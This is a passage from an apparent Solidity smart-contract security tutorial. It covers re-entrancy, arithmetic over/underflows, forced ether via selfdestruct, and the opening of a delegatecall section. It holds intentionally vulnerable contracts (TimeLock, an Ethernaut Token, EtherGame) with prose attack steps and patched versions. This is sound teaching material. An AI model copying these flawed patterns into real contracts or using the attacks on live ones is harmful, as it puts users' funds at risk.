        <span class="hljs-comment">// release the mutex after the external call</span>
        reEntrancyMutex = <span class="hljs-literal">false</span>;
    }
 }
</pre></div>

<h3 id="re-example">Real-World Example: The DAO</h3>

<p><a href="https://en.wikipedia.org/wiki/The_DAO_(organization)">The DAO</a> (Decentralized Autonomous Organization) was one of the major hacks that occurred in the early development of Ethereum. At the time, the contract held over $150 million USD. Re-entrancy played a major role in the attack which ultimately lead to the hard-fork that created Ethereum Classic (ETC). For a good analysis of the DAO exploit, see <a href="http://hackingdistributed.com/2016/06/18/analysis-of-the-dao-exploit/">Phil Daian's post</a>.</p>
<h2 id="ouflow"><span id="SP-2">2. Arithmetic Over/Under Flows</span></h2>

<p>The Ethereum Virtual Machine (EVM) specifies fixed-size data types for integers. This means that an integer variable, only has a certain range of numbers it can represent. A <code>uint8</code> for example, can only store numbers in the range [0,255]. Trying to store <code>256</code> into a <code>uint8</code> will result in <code>0</code>. If care is not taken, variables in Solidity can be exploited if user input is unchecked and calculations are performed which result in numbers that lie outside the range of the data type that stores them.</p>
<p>For further reading on arithmetic over/under flows, see <a href="https://medium.com/loom-network/how-to-secure-your-smart-contracts-6-solidity-vulnerabilities-and-how-to-avoid-them-part-1-c33048d4d17d">How to Secure Your Smart Contracts</a>, <a href="https://consensys.github.io/smart-contract-best-practices/known_attacks/#integer-overflow-and-underflow">Ethereum Smart Contract Best Practices</a> and <a href="https://randomoracle.wordpress.com/2018/04/27/ethereum-solidity-and-integer-overflows-programming-blockchains-like-1970/">Ethereum, Solidity and integer overflows: programming blockchains like 1970</a></p>
<h3 id="ou-vuln">The Vulnerability</h3>

<p>An over/under flow occurs when an operation is performed that requires a fixed size variable to store a number (or piece of data) that is outside the range of the variable's data type.</p>
<p>For example, subtracting <code>1</code> from a <code>uint8</code> (unsigned integer of 8 bits, i.e. only positive) variable that stores <code>0</code> as it's value, will result in the number <code>255</code>. This is an underflow. We have assigned a number below the range of the <code>uint8</code>, the result <em>wraps around</em> and gives the largest number a <code>uint8</code> can store. Similarly, adding <code>2^8=256</code> to a <code>uint8</code> will leave the variable unchanged as we have wrapped around the entire length of the <code>uint</code> (for the mathematicians, this is similar to adding $2\pi$ to the angle of a trigonometric function, $\sin(x) = \sin(x+2\pi)$). Adding numbers larger than the data type's range is called an overflow. For clarity, adding <code>257</code> to a <code>uint8</code> that currently has a zero value will result in the number <code>1</code>. It's sometimes instructive to think of fixed type variables being cyclic, where we start again from zero  if we add numbers above the largest possible stored number, and vice-versa for zero (where we start counting down from the largest number the more we subtract from 0).</p>
<p>These kinds of numerical caveats allow attackers to misuse code and create unexpected logic flows. For example, consider the time locking contract below.</p>
<p>TimeLock.sol:</p>
<div class="highlight"><pre class="hljs language-solidity"><span class="hljs-function"><span class="hljs-keyword">contract</span> <span class="hljs-title">TimeLock</span> </span>{

    <span class="hljs-keyword">mapping</span>(<span class="hljs-built_in">address</span> =&gt; <span class="hljs-built_in">uint</span>) <span class="hljs-keyword">public</span> balances;
    <span class="hljs-keyword">mapping</span>(<span class="hljs-built_in">address</span> =&gt; <span class="hljs-built_in">uint</span>) <span class="hljs-keyword">public</span> lockTime;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deposit</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">payable</span> </span>{
        balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] += <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>;
        lockTime[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] = <span class="hljs-built_in">now</span> + <span class="hljs-number">1</span> <span class="hljs-built_in">weeks</span>;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">increaseLockTime</span>(<span class="hljs-params"><span class="hljs-built_in">uint</span> _secondsToIncrease</span>) <span class="hljs-title">public</span> </span>{
        lockTime[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] += _secondsToIncrease;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdraw</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> </span>{
        <span class="hljs-built_in">require</span>(balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] &gt; <span class="hljs-number">0</span>);
        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">now</span> &gt; lockTime[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>]);
        <span class="hljs-built_in">uint</span> transferValue = balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>];
        balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] = <span class="hljs-number">0</span>;
        <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">transfer</span>(transferValue);
    }
}
</pre></div>

<p>This contract is designed to act like a time vault, where users can deposit ether into the contract and it will be locked there for at least a week. The user may extend the wait time to longer than 1 week if they choose, but once deposited, the user can be sure their ether is locked in safely for at least a week. Or can they?...</p>
<p>In the event a user is forced to hand over their private key (think hostage situation) a contract such as this may be handy to ensure ether is unobtainable in short periods of time. If a user had locked in <code>100 ether</code> in this contract and handed their keys over to an attacker, an attacker could use an overflow to receive the ether, regardless of the <code>lockTime</code>.</p>
<p>The attacker could determine the current <code>lockTime</code> for the address they now hold the key for (its a public variable). Let's call this <code>userLockTime</code>. They could then call the <code>increaseLockTime</code> function and pass as an argument the number <code>2^256 - userLockTime</code>. This number  would be added to the current <code>userLockTime</code> and cause an overflow, resetting <code>lockTime[msg.sender]</code> to <code>0</code>. The attacker could then simply call the <code>withdraw</code> function to obtain their reward.</p>
<p>Let's look at another example, this one from the <a href="https://github.com/OpenZeppelin/ethernaut">Ethernaut Challanges</a>.</p>
<p><strong>SPOILER ALERT:</strong> <em>If you've not yet done the Ethernaut challenges, this gives a solution to one of the levels</em>.</p>
<div class="highlight"><pre class="hljs language-solidity"><span class="hljs-keyword">pragma</span> solidity ^<span class="hljs-number">0.4</span><span class="hljs-number">.18</span>;

<span class="hljs-function"><span class="hljs-keyword">contract</span> <span class="hljs-title">Token</span> </span>{

  <span class="hljs-keyword">mapping</span>(<span class="hljs-built_in">address</span> =&gt; <span class="hljs-built_in">uint</span>) balances;
  <span class="hljs-built_in">uint</span> <span class="hljs-keyword">public</span> totalSupply;

  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Token</span>(<span class="hljs-params"><span class="hljs-built_in">uint</span> _initialSupply</span>) </span>{
    balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] = totalSupply = _initialSupply;
  }

  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">transfer</span>(<span class="hljs-params"><span class="hljs-built_in">address</span> _to, <span class="hljs-built_in">uint</span> _value</span>) <span class="hljs-title">public</span> <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-built_in">bool</span></span>) </span>{
    <span class="hljs-built_in">require</span>(balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] - _value &gt;= <span class="hljs-number">0</span>);
    balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] -= _value;
    balances[_to] += _value;
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
  }

  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">balanceOf</span>(<span class="hljs-params"><span class="hljs-built_in">address</span> _owner</span>) <span class="hljs-title">public</span> <span class="hljs-title">constant</span> <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-built_in">uint</span> balance</span>) </span>{
    <span class="hljs-keyword">return</span> balances[_owner];
  }
}
</pre></div>

<p>This is a simple token contract which employs a <code>transfer()</code> function, allowing participants to move their tokens around. Can you see the error in this contract?</p>
<p>The flaw comes in the <code>transfer()</code> function. The require statement on line [13] can be bypassed using an underflow. Consider a user that has no balance. They could call the <code>transfer()</code> function with any non-zero <code>_value</code> and pass the require statement on line [13]. This is because <code>balances[msg.sender]</code> is zero (and a <code>uint256</code>) so subtracting any positive amount (excluding <code>2^256</code>) will result in a positive number due to the underflow we described above. This is also true for line [14], where our balance will be credited with a positive number. Thus, in this example, we have achieved free tokens due to an underflow vulnerability.</p>
<h3 id="ou-prevention">Preventative Techniques</h3>

<p>The (currently) conventional technique to guard against under/overflow vulnerabilities is to use or build mathematical libraries which replace the standard math operators; addition, subtraction and multiplication (division is excluded as it doesn't cause over/under flows and the EVM reverts on division by 0).</p>
<p><a href="https://github.com/OpenZeppelin/zeppelin-solidity">OppenZepplin</a> have done a great job in building and auditing secure libraries which can be leveraged by the Ethereum community. In particular, their <a href="https://github.com/OpenZeppelin/zeppelin-solidity/blob/master/contracts/math/SafeMath.sol">Safe Math Library</a> is a reference or library to use to avoid under/over flow vulnerabilities.</p>
<p>To demonstrate how these libraries are used in Solidity, let us correct the <code>TimeLock</code> contract, using Open Zepplin's <code>SafeMath</code> library. The over flow-free contract would become:</p>
<div class="highlight"><pre class="hljs language-solidity"><span class="hljs-function"><span class="hljs-keyword">library</span> <span class="hljs-title">SafeMath</span> </span>{

  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">mul</span>(<span class="hljs-params"><span class="hljs-built_in">uint256</span> a, <span class="hljs-built_in">uint256</span> b</span>) <span class="hljs-title">internal</span> <span class="hljs-title">pure</span> <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-built_in">uint256</span></span>) </span>{
    <span class="hljs-keyword">if</span> (a == <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    }
    <span class="hljs-built_in">uint256</span> c = a * b;
    <span class="hljs-built_in">assert</span>(c / a == b);
    <span class="hljs-keyword">return</span> c;
  }

  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">div</span>(<span class="hljs-params"><span class="hljs-built_in">uint256</span> a, <span class="hljs-built_in">uint256</span> b</span>) <span class="hljs-title">internal</span> <span class="hljs-title">pure</span> <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-built_in">uint256</span></span>) </span>{
    <span class="hljs-comment">// assert(b &gt; 0); // Solidity automatically throws when dividing by 0</span>
    <span class="hljs-built_in">uint256</span> c = a / b;
    <span class="hljs-comment">// assert(a == b * c + a % b); // There is no case in which this doesn't hold</span>
    <span class="hljs-keyword">return</span> c;
  }

  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sub</span>(<span class="hljs-params"><span class="hljs-built_in">uint256</span> a, <span class="hljs-built_in">uint256</span> b</span>) <span class="hljs-title">internal</span> <span class="hljs-title">pure</span> <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-built_in">uint256</span></span>) </span>{
    <span class="hljs-built_in">assert</span>(b &lt;= a);
    <span class="hljs-keyword">return</span> a - b;
  }

  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add</span>(<span class="hljs-params"><span class="hljs-built_in">uint256</span> a, <span class="hljs-built_in">uint256</span> b</span>) <span class="hljs-title">internal</span> <span class="hljs-title">pure</span> <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-built_in">uint256</span></span>) </span>{
    <span class="hljs-built_in">uint256</span> c = a + b;
    <span class="hljs-built_in">assert</span>(c &gt;= a);
    <span class="hljs-keyword">return</span> c;
  }
}

<span class="hljs-function"><span class="hljs-keyword">contract</span> <span class="hljs-title">TimeLock</span> </span>{
    <span class="hljs-keyword">using</span> SafeMath <span class="hljs-keyword">for</span> <span class="hljs-built_in">uint</span>; <span class="hljs-comment">// use the library for uint type</span>
    <span class="hljs-keyword">mapping</span>(<span class="hljs-built_in">address</span> =&gt; <span class="hljs-built_in">uint256</span>) <span class="hljs-keyword">public</span> balances;
    <span class="hljs-keyword">mapping</span>(<span class="hljs-built_in">address</span> =&gt; <span class="hljs-built_in">uint256</span>) <span class="hljs-keyword">public</span> lockTime;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deposit</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">payable</span> </span>{
        balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] = balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>].add(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>);
        lockTime[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] = <span class="hljs-built_in">now</span>.add(<span class="hljs-number">1</span> <span class="hljs-built_in">weeks</span>);
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">increaseLockTime</span>(<span class="hljs-params"><span class="hljs-built_in">uint256</span> _secondsToIncrease</span>) <span class="hljs-title">public</span> </span>{
        lockTime[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] = lockTime[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>].add(_secondsToIncrease);
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdraw</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> </span>{
        <span class="hljs-built_in">require</span>(balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] &gt; <span class="hljs-number">0</span>);
        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">now</span> &gt; lockTime[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>]);
        <span class="hljs-built_in">uint</span> transferValue = balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>];
        balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] = <span class="hljs-number">0</span>;
        <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">transfer</span>(transferValue);
    }
}
</pre></div>

<p>Notice that all standard math operations have been replaced by the those defined in the <code>SafeMath</code> library. The <code>TimeLock</code> contract no longer performs any operation which is capable of doing an under/over flow.</p>
<h3 id="ou-example">Real-World Examples: PoWHC and Batch Transfer Overflow (<a href="https://nvd.nist.gov/vuln/detail/CVE-2018-10299">CVE-201810299</a>)</h3>

<p>A 4chan group decided it was a great idea to build a ponzi scheme on Ethereum, written in Solidity. They called it the Proof of Weak Hands Coin (PoWHC). Unfortunately it seems that the author(s) of the contract hadn't seen over/under flows before and consequently, 866 ether was liberated from its contract. A good overview of how the underflow occurs (which is not too dissimilar to the Ethernaut challenge above) is given in <a href="https://blog.goodaudience.com/how-800k-evaporated-from-the-powh-coin-ponzi-scheme-overnight-1b025c33b530">Eric Banisadar's post</a>.</p>
<p>Some developers also implemented a <code>batchTransfer()</code> function into some <a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md">ERC20</a> token contracts. The implementation contained an overflow. <a href="https://medium.com/@peckshield/alert-new-batchoverflow-bug-in-multiple-erc20-smart-contracts-cve-2018-10299-511067db6536">This post</a> explains it, however I think the title is misleading, in that it has nothing to do with the ERC20 standard, rather some ERC20 token contracts have a vulnerable <code>batchTransfer()</code> function implemented.</p>
<h2 id="ether"><span id="SP-3">3. Unexpected Ether</span></h2>

<p>Typically when ether is sent to a contract, it must execute either the fallback function, or another function described in the contract. There are two exceptions to this, where ether can exist in a contract without having executed any code. Contracts which rely on code execution for every ether sent to the contract can be vulnerable to attacks where ether is forcibly sent to a contract.</p>
<p>For further reading on this, see <a href="https://medium.com/loom-network/how-to-secure-your-smart-contracts-6-solidity-vulnerabilities-and-how-to-avoid-them-part-2-730db0aa4834">How to Secure Your Smart Contracts: 6</a> and <a href="http://danielszego.blogspot.com.au/2018/03/solidity-security-patterns-forcing.html"> Solidity security patterns - forcing ether to a contract </a>.</p>
<h3 id="ether-vuln">The Vulnerability</h3>

<p>A common defensive programming technique that is useful in enforcing correct state transitions or validating operations is <em>invariant-checking</em>. This technique involves defining a set of invariants (metrics or parameters that should not change) and checking these invariants remain unchanged after a single (or many) operation(s). This is typically good design, provided the invariants being checked are in fact invariants. One example of an invariant is the <code>totalSupply</code> of a fixed issuance <a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md">ERC20</a> token. As no functions should modify this invariant, one could add a check to the <code>transfer()</code> function that ensures the <code>totalSupply</code> remains unmodified to ensure the function is working as expected.</p>
<p>In particular, there is one apparent <em>invariant</em>, that may be tempting to use
but can in fact be manipulated by external users (regardless of the rules put
in place in the smart contract) .This is the current ether stored in the
contract. Often when developers first learn Solidity they have the
misconception that a contract can only accept or obtain ether via payable
functions. This misconception can lead to  contracts that have false
assumptions about the ether balance within them which can lead to a range of
vulnerabilities. The smoking gun for this vulnerability is the (incorrect) use
of <code>this.balance</code>. As we will see, incorrect uses of <code>this.balance</code> can lead to
serious vulnerabilities of this type.</p>
<p>There are two ways in which ether can (forcibly) be sent to a contract without using a <code>payable</code> function or executing any code on the contract. These are listed below.</p>
<h4>Self Destruct / Suicide</h4>
<p>Any contract is able to implement the <a href="http://solidity.readthedocs.io/en/latest/introduction-to-smart-contracts.html#self-destruct"><code>selfdestruct(address)</code></a> function, which removes all bytecode from the contract address and sends all ether stored there to the parameter-specified address. If this specified address is also a contract, no functions (including the fallback) get called. Therefore, the <code>selfdestruct()</code> function can be used to forcibly send ether to any contract regardless of any code that may exist in the contract. This is inclusive of contracts without any payable functions. This means, any attacker can create a contract with a <code>selfdestruct()</code> function, send ether to it, call <code>selfdestruct(target)</code> and force ether to be sent to a <code>target</code> contract. Martin Swende has an excellent <a href="http://martin.swende.se/blog/Ethereum_quirks_and_vulns.html">blog post</a> describing some quirks of the self-destruct opcode (Quirk #2) along with a description of how client nodes were checking incorrect invariants which could have lead to a rather catastrophic nuking of clients.</p>
<h4>Pre-sent Ether</h4>
<p>The second way a contract can obtain ether without using a <code>selfdestruct()</code> function or calling any payable functions is to pre-load the contract address with ether. Contract addresses are deterministic, in fact the address is calculated from the keccak256 (sometimes synonomous with SHA3) hash of the address creating the contract and the transaction nonce which creates the contract. Specifically, it is of the form: <code>address = sha3(rlp.encode([account_address,transaction_nonce]))</code> (see <a href="https://blog.sigmaprime.io/solidity-security.html#keyless-eth">Keyless Ether</a> for some fun use cases of this). This means, anyone can calculate what a contract address will be before it is created and thus send ether to that address. When the contract does get created it will have a non-zero ether balance.</p>
<p>Let's explore some pitfalls that can arise given the above knowledge.</p>
<p>Consider the overly-simple contract,</p>
<p>EtherGame.sol:</p>
<div class="highlight"><pre class="hljs language-solidity"><span class="hljs-function"><span class="hljs-keyword">contract</span> <span class="hljs-title">EtherGame</span> </span>{

    <span class="hljs-built_in">uint</span> <span class="hljs-keyword">public</span> payoutMileStone1 = <span class="hljs-number">3</span> <span class="hljs-built_in">ether</span>;
    <span class="hljs-built_in">uint</span> <span class="hljs-keyword">public</span> mileStone1Reward = <span class="hljs-number">2</span> <span class="hljs-built_in">ether</span>;
    <span class="hljs-built_in">uint</span> <span class="hljs-keyword">public</span> payoutMileStone2 = <span class="hljs-number">5</span> <span class="hljs-built_in">ether</span>;
    <span class="hljs-built_in">uint</span> <span class="hljs-keyword">public</span> mileStone2Reward = <span class="hljs-number">3</span> <span class="hljs-built_in">ether</span>;
    <span class="hljs-built_in">uint</span> <span class="hljs-keyword">public</span> finalMileStone = <span class="hljs-number">10</span> <span class="hljs-built_in">ether</span>;
    <span class="hljs-built_in">uint</span> <span class="hljs-keyword">public</span> finalReward = <span class="hljs-number">5</span> <span class="hljs-built_in">ether</span>;

    <span class="hljs-keyword">mapping</span>(<span class="hljs-built_in">address</span> =&gt; <span class="hljs-built_in">uint</span>) redeemableEther;
    <span class="hljs-comment">// users pay 0.5 ether. At specific milestones, credit their accounts</span>
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">play</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">payable</span> </span>{
        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span> == <span class="hljs-number">0.5</span> <span class="hljs-built_in">ether</span>); <span class="hljs-comment">// each play is 0.5 ether</span>
        <span class="hljs-built_in">uint</span> currentBalance = <span class="hljs-keyword">this</span>.balance + <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>;
        <span class="hljs-comment">// ensure no players after the game as finished</span>
        <span class="hljs-built_in">require</span>(currentBalance &lt;= finalMileStone);
        <span class="hljs-comment">// if at a milestone credit the players account</span>
        <span class="hljs-keyword">if</span> (currentBalance == payoutMileStone1) {
            redeemableEther[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] += mileStone1Reward;
        }
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (currentBalance == payoutMileStone2) {
            redeemableEther[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] += mileStone2Reward;
        }
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (currentBalance == finalMileStone ) {
            redeemableEther[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] += finalReward;
        }
        <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">claimReward</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> </span>{
        <span class="hljs-comment">// ensure the game is complete</span>
        <span class="hljs-built_in">require</span>(<span class="hljs-keyword">this</span>.balance == finalMileStone);
        <span class="hljs-comment">// ensure there is a reward to give</span>
        <span class="hljs-built_in">require</span>(redeemableEther[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] &gt; <span class="hljs-number">0</span>);
        <span class="hljs-built_in">uint</span> transferValue = redeemableEther[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>];
        redeemableEther[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] = <span class="hljs-number">0</span>;
        <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">transfer</span>(transferValue);
    }
 }
</pre></div>

<p>This contract represents a simple game (which would naturally invoke <a href="https://blog.sigmaprime.io/solidity-security.html#race-conditions">race-conditions</a>) whereby players send <code>0.5 ether</code> quanta to the contract in hope to be the player that reaches one of three milestones first. Milestone's are denominated in ether. The first to reach the milestone may claim a portion of the ether when the game has ended. The game ends when the final milestone (<code>10 ether</code>) is reached and users can claim their rewards.</p>
<p>The issues with the <code>EtherGame</code> contract come from the poor use of <code>this.balance</code> in both lines [14] (and by association [16]) and [32]. A mischievous attacker could forcibly send a small amount of ether, let's say <code>0.1 ether</code> via the <code>selfdestruct()</code> function (discussed above) to prevent any future players from reaching a milestone. As all legitimate players can only send <code>0.5 ether</code> increments, <code>this.balance</code> would no longer be half integer numbers, as it would also have the <code>0.1 ether</code> contribution. This prevents all the if conditions on lines [18], [21] and [24] from being true.</p>
<p>Even worse, a vengeful attacker who missed a milestone, could forcibly send <code>10 ether</code> (or an equivalent amount of ether that pushes the contract's balance above the <code>finalMileStone</code>) which would lock all rewards in the contract forever. This is because the <code>claimReward()</code> function will always revert, due to the require on line [32] (i.e. <code>this.balance</code> is greater than <code>finalMileStone</code>).</p>
<h3 id="ether-prevention">Preventative Techniques</h3>

<p>This vulnerability typically arises from the misuse of <code>this.balance</code>. Contract logic, when possible, should avoid being dependent on exact values of the balance of the contract because it can be artificially manipulated. If applying logic based on <code>this.balance</code>, ensure to account for unexpected balances.</p>
<p>If exact values of deposited ether are required, a self-defined variable should be used that gets incremented in payable functions, to safely track the deposited ether. This variable will not be influenced by the forced ether sent via a <code>selfdestruct()</code> call.</p>
<p>With this in mind, a corrected version of the <code>EtherGame</code> contract could look like:</p>
<div class="highlight"><pre class="hljs language-solidity"><span class="hljs-function"><span class="hljs-keyword">contract</span> <span class="hljs-title">EtherGame</span> </span>{

    <span class="hljs-built_in">uint</span> <span class="hljs-keyword">public</span> payoutMileStone1 = <span class="hljs-number">3</span> <span class="hljs-built_in">ether</span>;
    <span class="hljs-built_in">uint</span> <span class="hljs-keyword">public</span> mileStone1Reward = <span class="hljs-number">2</span> <span class="hljs-built_in">ether</span>;
    <span class="hljs-built_in">uint</span> <span class="hljs-keyword">public</span> payoutMileStone2 = <span class="hljs-number">5</span> <span class="hljs-built_in">ether</span>;
    <span class="hljs-built_in">uint</span> <span class="hljs-keyword">public</span> mileStone2Reward = <span class="hljs-number">3</span> <span class="hljs-built_in">ether</span>;
    <span class="hljs-built_in">uint</span> <span class="hljs-keyword">public</span> finalMileStone = <span class="hljs-number">10</span> <span class="hljs-built_in">ether</span>;
    <span class="hljs-built_in">uint</span> <span class="hljs-keyword">public</span> finalReward = <span class="hljs-number">5</span> <span class="hljs-built_in">ether</span>;
    <span class="hljs-built_in">uint</span> <span class="hljs-keyword">public</span> depositedWei;

    <span class="hljs-keyword">mapping</span> (<span class="hljs-built_in">address</span> =&gt; <span class="hljs-built_in">uint</span>) redeemableEther;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">play</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">payable</span> </span>{
        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span> == <span class="hljs-number">0.5</span> <span class="hljs-built_in">ether</span>);
        <span class="hljs-built_in">uint</span> currentBalance = depositedWei + <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>;
        <span class="hljs-comment">// ensure no players after the game as finished</span>
        <span class="hljs-built_in">require</span>(currentBalance &lt;= finalMileStone);
        <span class="hljs-keyword">if</span> (currentBalance == payoutMileStone1) {
            redeemableEther[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] += mileStone1Reward;
        }
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (currentBalance == payoutMileStone2) {
            redeemableEther[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] += mileStone2Reward;
        }
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (currentBalance == finalMileStone ) {
            redeemableEther[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] += finalReward;
        }
        depositedWei += <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>;
        <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">claimReward</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> </span>{
        <span class="hljs-comment">// ensure the game is complete</span>
        <span class="hljs-built_in">require</span>(depositedWei == finalMileStone);
        <span class="hljs-comment">// ensure there is a reward to give</span>
        <span class="hljs-built_in">require</span>(redeemableEther[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] &gt; <span class="hljs-number">0</span>);
        <span class="hljs-built_in">uint</span> transferValue = redeemableEther[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>];
        redeemableEther[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] = <span class="hljs-number">0</span>;
        <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">transfer</span>(transferValue);
    }
 }
</pre></div>

<p>Here, we have just created a new variable, <code>depositedEther</code> which keeps track of the known ether deposited, and it is this variable to which we perform our requirements and tests. Notice, that we no longer have any reference to <code>this.balance</code>.</p>
<h3 id="ether-example">Real-World Example: Unknown </h3>

<p>I'm yet to find and example of this that has been exploited in the wild. However, a few examples of exploitable contracts were given in the <a href="https://github.com/Arachnid/uscc/tree/master/submissions-2017/">Underhanded Solidity Contest</a>.</p>
<h2 id="delegatecall"><span id="SP-4">4. Delegatecall</span></h2>

<p>The <code>CALL</code> and <code>DELEGATECALL</code> opcodes are useful in allowing Ethereum developers to modularise their code. Standard external message calls to contracts are handled by the <code>CALL</code> opcode whereby code is run in the context of the external contract/function. The <code>DELEGATECALL</code> opcode is identical to the standard message call, except that the code executed at the targeted address is run in the context of the calling contract along with the fact that <code>msg.sender</code> and <code>msg.value</code> remain unchanged. This feature enables the implementation of <em>libraries</em> whereby developers can create reusable code for future contracts.</p>
<p>Although the differences between these two opcodes are simple and intuitive, the use of <code>DELEGATECALL</code> can lead to unexpected code execution.</p>
<p>For further reading, see <a href="https://ethereum.stackexchange.com/questions/3667/difference-between-call-callcode-and-delegatecall">Ethereum Stack Exchange Question</a>, <a href="http://solidity.readthedocs.io/en/latest/introduction-to-smart-contracts.html#delegatecall-callcode-and-libraries">Solidity Docs</a> and <a href="https://medium.com/loom-network/how-to-secure-your-smart-contracts-6-solidity-vulnerabilities-and-how-to-avoid-them-part-1-c33048d4d17d">How to Secure Your Smart Contracts: 6</a>.</p>
<h3 id="dc-vuln">The Vulnerability</h3>

<p>The context preserving nature of <code>DELEGATECALL</code> has proved that building vulnerability-free custom libraries is not as easy as one might think. The code in libraries themselves can be secure and vulnerability-free however when run in the context of another application new vulnerabilities can arise. Let's see a fairly complex example of this, using Fibonacci numbers.</p>
<p>Consider the following library which can generate the Fibonacci sequence and sequences of similar form.
<code>FibonacciLib.sol</code><sup id="fnref:1"><a class="footnote-ref" href="https://blog.sigmaprime.io/solidity-security.html#fn:1">1</a></sup></p>
<div class="highlight"><pre class="hljs language-solidity"><span class="hljs-comment">// library contract - calculates fibonacci-like numbers;</span>
<span class="hljs-function"><span class="hljs-keyword">contract</span> <span class="hljs-title">FibonacciLib</span> </span>{
    <span class="hljs-comment">// initializing the standard fibonacci sequence;</span>
    <span class="hljs-built_in">uint</span> <span class="hljs-keyword">public</span> start;
    <span class="hljs-built_in">uint</span> <span class="hljs-keyword">public</span> calculatedFibNumber;

    <span class="hljs-comment">// modify the zeroth number in the sequence</span>
